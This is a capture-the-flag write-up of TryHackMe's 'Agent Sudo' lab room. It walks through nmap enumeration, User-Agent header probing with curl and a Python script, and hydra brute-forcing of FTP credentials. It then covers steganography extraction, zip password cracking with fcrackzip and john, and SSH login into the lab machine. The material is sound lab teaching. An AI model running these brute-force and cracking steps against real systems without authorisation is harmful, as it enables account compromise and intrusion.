# Agent Sudo

In my opinion the [Agent Sudo](https://tryhackme.com/room/agentsudoctf) room on TryHackMe is one of the best rooms for beginners. It focuses on various things related to enumeration, steganography as well as reverse image searching. There were some things that even I encountered for the first time. 

So, let's begin!



## Initial Enumeration



### [Task 1] Author note

We don't need to do anything more than just deploying the machine for this task and get the IP address for the box.



### [Task 2] Enumerate

1. ##### How many open ports?

This can be found out by simply running an `nmap` scan on the target machine.  The results of the scan would look somewhat like:

```
tester@kali:~/Desktop$ nmap -A -T4 10.10.92.183
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 00:10 IST
Nmap scan report for 10.10.92.183
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.51 seconds

```

From the above results, we can count the number of open ports easily.

2. ##### How you redirect yourself to a secret page?

We can visit the machine IP to check if we get some useful information over there. 

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

And we do find the answer to the question directly at the homepage which says that we need to use our codename as the  `user-agent` while sending the `GET` request to the mahine. This can be done using `curl`.

3. ##### What is the agent name?

We know that one of the agents name is R, so we can first create a request with R as our user-agent and check if get some other information. Some of the curl requests that we can try to access the site are given below:

```
tester@kali:~$ curl -A "Agent R" 10.10.62.92
tester@kali:~$ curl -A "r" 10.10.62.92
tester@kali:~$ curl -A "agent r" 10.10.62.92
tester@kali:~$ curl -A "R" 10.10.62.92
```

With all the first 3 requests we would still go to the site that opens up with default user-agent but with the fourth one we get some different response:

```
tester@kali:~$ curl -A "R" 10.10.62.92
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

With this, now we know how we modify the user-agent in order to access the site. We can either write a script to automate this process or do this manually. I wrote a simple script to dump the response with all the uppercase characters as user-agent:

```
import requests 
import string
session = requests.session()

url = "http://10.10.209.195"



for char in string.ascii_uppercase:
	headers = {'User-Agent': char}

	response = session.get(url, headers=headers)
	print ("*********************", char, "************************")
	print (response.text)
```

From the output of this script we can see that for request with `C` as user-agent the response was different:

```
Attention *****, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

From this output, we get the agent's name which can be submitted as the answer to third question.

### [Task 3] Hash cracking and brute-force                                

1. ##### FTP password

From the last question we know that Agent C's password is weak and also we know his name. So, we can now use `hydra` to bruteforce their password:

 ```
tester@kali:~$ hydra -l ***** -P /usr/share/wordlists/rockyou.txt 10.10.209.195 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 04:44:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.209.195:21/
[STATUS] 149.00 tries/min, 149 tries in 00:01h, 14344250 to do in 1604:31h, 16 active
[21][ftp] host: 10.10.209.195   login: *****   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-13 04:46:35

 ```

With this, we found the password for one of the user's on the machine. Also, this password can be submitted as the answer to the first question.

2. ##### Zip file password

We can access the FTP using the credentials we found in last question and check the files to which we have access:

```
tester@kali:~/Downloads$ ftp 10.10.209.195
Connected to 10.10.209.195.
220 (vsFTPd 3.0.3)
Name (10.10.209.195:tester): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
```

We can see that there are 3 image files present in the FTP. We can download all of them using the command `mget *`. Once, downloaded, we can check the content of each of these files. 

Let's begin with the text file first:

```
tester@kali:~/Downloads/agent_sudo$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

From this message, there are few important points that we need to note:

	1. If all these images are fake, there must be some real image.
 	2. Real image is stored inside Agent J's directory.
 	3. Agent J's account password is stored in these fake images (hints towards steganography).

Now, we have two images one is `.png` and the other is `.jpg`. Also, we know that jpg files can be used for hiding data using steganography. So, we can try to extract it's content using `steghide`:

```
tester@kali:~/Downloads/agent_sudo$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

But as we don't know the passphrase, we won't be able to access it's content.

We also have another png image on which we can run the `binwalk` command:

```
tester@kali:~/Downloads/agent_sudo$ binwalk -e cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

And binwalk finds some hidden content in the image and extracts it to a folder `_cutie.png.extracted`. We can see in the newly created directory that 4 files have been detected:

```
tester@kali:~/Downloads/agent_sudo/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt
```

The ` To_agentR.txt` file appears to be empty where as the file `file` when checked with the `file` command shows simply content type as data. Even using the `strings` command does not provide any useful result. We are also having a `zip` file but it appears to be locked with a password:

```
tester@kali:~/Downloads/agent_sudo/_cutie.png.extracted$ unzip 8702.zip
Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```

We can use `fcrackzip` to crack the password for this zip file:

```
tester@kali:~/Downloads/agent_sudo/_cutie.png.extracted$ fcrackzip 8702.zip -v -u -D -p /usr/share/wordlists/rockyou.txt 
found file 'To_agentR.txt', (size cp/uc     98/    86, flags 1, chk 0000)
```

But it can be seen that the password was not found.

| Switch | Meaning                                 |
| :----- | --------------------------------------- |
| -v     | Verbose                                 |
| -u     | use `unzip` to weed out wrong passwords |
| -D     | use a dictionary                        |
| -p     | use strings as password                 |

So, the next thing we can do is use `zip2john` to crack the password, which can be done as:

```
tester@kali:~/Downloads/agent_sudo/_cutie.png.extracted$ zip2john 8702.zip > for_john
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
tester@kali:~/Downloads/agent_sudo/_cutie.png.extracted$ john for_john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*****            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2020-08-13 05:22) 1.234g/s 30340p/s 30340c/s 30340C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

What we have done over here is:

1. First converted the zip to a format that can be understood by john using `zip2john` and stored it in a file named `for_john`.
2. Then we used `john` to crack the password in `for_john` file and specified that the fomat of the value that is to be cracked is `zip`

And in this way we get the password of the zip. This password is also the answer to the second question.

3. ##### steg password

Now, that we have the password of the zip file, we can extract it's content and read the file `To_agentR.txt`.

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

We can see that there is an encrypted string `QXJlYTUx` in the message. We can decode it using [CyberChef](https://gchq.github.io/CyberChef/)'s magic method. From there, we can see that the string was `Base64` encoded. We can try to use this decoded value as the passphrase for `cutie.jpg` file:

```
tester@kali:~/Downloads/agent_sudo$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
```

And we were able to extract a new file. So, now we know the steg password as well that can be submitted as the password to the third question.

4. ##### Who is the other agent (in full name)?

We can now read the `message.txt` and see if there is some useful information.

```
tester@kali:~/Downloads/agent_sudo$ cat message.txt 
Hi *****,

Glad you find this message. Your login password is *************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

We do find the name of the other user at the very beginning of this message. This name can be submitted as the answer to the fourth question.

5. ##### SSH password

In the `message.txt` file itself, we can find the password for the user. We can use the same username and password to gain SSH access to the machine. Also, this password can be submitted as the answer to the fifth question.

### [Task 4] Capture the user flag

1. ##### What is the user flag?

To get the user flag, we can SSH into the user's account:

````
tester@kali:~/Downloads/agent_sudo$ ssh james@10.10.57.162
The authenticity of host '10.10.57.162 (10.10.57.162)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.57.162' (ECDSA) to the list of known hosts.
james@10.10.57.162's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
james@agent-sudo:~$ cat user_flag.txt 
````

So, we found the user flag. 

2. ##### What is the incident of the photo called?

In the same directory we can find a file `Alien_autospy.jpg`. To view this file, we need to download this file on our local machine. This can done by starting a python server on the target machine and using `wget` on the local machine to download the file:

![file_download](./.images/file_download.png)

It can be seen that in the lower half we have started a python3 server on the target machine and in the upper half of the image we have used wget to download the file on our local machine.

On opening the image, we can find that it is shows a dead alien. We can use [Google Image Search](https://www.google.com/imghp?hl=EN) to upload the file and find information related to the image.

Hint: You can easily get the first two words but for the third word think of some term similar to the second term in image's filename.



## Some Key Points to Take Away

1. Use `curl` to change the User-Agent.
2. When you have a zip file:
   * Use `fcrackzip` to crack it's password
   * OR use `zip2john` along with `john` to crack the password
3. Try to think of reverse searching the image if some details for the same are needed.
